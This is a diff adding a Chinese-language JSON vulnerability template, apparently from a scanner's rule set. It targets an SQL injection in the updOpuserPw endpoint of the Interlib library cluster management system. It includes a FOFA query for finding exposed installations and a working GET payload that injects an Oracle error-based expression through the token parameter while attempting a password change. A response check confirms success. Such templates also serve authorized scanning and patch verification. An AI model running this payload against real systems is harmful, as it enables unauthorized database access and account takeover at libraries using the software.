@@ -1,0 +1,37 @@
+{
+  "product": "图创图书馆集群管理系统",
+  "vul_name": "图创图书馆集群管理系统 updOpuserPw接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "图书馆集群管理系统Interlib是新一代的图书馆自动化系统,采用开放的多层结构体系,基于Internet实现传统业务管理与海量数字资源管理的结合。图创图书馆集群管理系统 updOpuserPw接口存在SQL注入漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"interlib\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486420&idx=2&sn=6a461c6f7a17fdcdb37ce5181a0437a8&chksm=974b86d3a03c0fc5b25d3592e1e135576bebb3f4f92b788e74d3ae43137f9747e135c7926705&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%201433*223%20from%20dual))=%272"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "319559"
+        }
+      ]
+    }
+  }
+}
